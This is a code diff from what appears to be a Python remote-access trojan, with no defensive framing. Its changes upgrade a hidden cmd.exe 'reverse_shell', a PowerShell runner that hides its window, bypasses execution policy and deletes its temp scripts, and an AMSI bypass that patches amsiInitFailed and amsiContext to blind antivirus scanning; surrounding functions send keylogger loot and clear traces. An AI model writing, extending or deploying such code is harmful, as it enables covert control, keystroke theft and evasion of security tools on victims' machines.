@@ -644,10 +644,47 @@ def keylog_flush(clear_only=False):
         send_loot("keylog_clear", "1")
         send_loot("status", "keylog cleared")
 
-def reverse_shell(cmd): return hidden_run(cmd, timeout=90)
-def run_powershell(ps_cmd):
-    full=f'powershell -NoProfile -WindowStyle Hidden -Command "{ps_cmd}"'
-    return hidden_run(full, timeout=90)
+def reverse_shell(cmd):
+    """Hidden cmd.exe shell with timeout."""
+    return hidden_run(cmd, timeout=120)
+
+def run_powershell(ps_cmd, timeout=120, encoded=True):
+    """Reliable PowerShell runner.
+    Uses -EncodedCommand (UTF-16LE base64) so quotes/newlines/ampersands never break.
+    Falls back to -File temp script if needed.
+    """
+    try:
+        import base64 as _b64
+        # strip outer quotes the panel sometimes adds
+        ps = (ps_cmd or "").strip()
+        if len(ps) >= 2 and ((ps[0] == ps[-1] == '"') or (ps[0] == ps[-1] == "'")):
+            ps = ps[1:-1]
+        if encoded and ps:
+            # UTF-16LE is what powershell -EncodedCommand expects
+            b64 = _b64.b64encode(ps.encode("utf-16le")).decode("ascii")
+            full = (
+                'powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden '
+                f'-ExecutionPolicy Bypass -EncodedCommand {b64}'
+            )
+            out = hidden_run(full, timeout=timeout)
+            if out and "is not recognized" not in out.lower():
+                return out
+        # fallback: write temp .ps1 and -File it
+        sp = Path(tempfile.gettempdir()) / f"nyx_{random.randint(10000,99999)}.ps1"
+        try:
+            sp.write_text(ps, encoding="utf-8")
+            full = (
+                'powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden '
+                f'-ExecutionPolicy Bypass -File "{sp}"'
+            )
+            return hidden_run(full, timeout=timeout)
+        finally:
+            try:
+                sp.unlink()
+            except Exception:
+                pass
+    except Exception as e:
+        return f"ps err: {e}"
 
 
 
@@ -2612,7 +2649,14 @@ def apply_boot_policy():
 
 
 def amsi_bypass_ps():
-    return "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); "
+    # multi-path AMSI patch (field + context force)
+    return (
+        "$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');"
+        "if($a){$f=$a.GetField('amsiInitFailed','NonPublic,Static');if($f){$f.SetValue($null,$true)}};"
+        "try{[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType("
+        "'System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]"
+        "'NonPublic,Static').GetValue($null),0x80070057)}catch{};"
+    )
 
 def clear_traces():
     results=[]
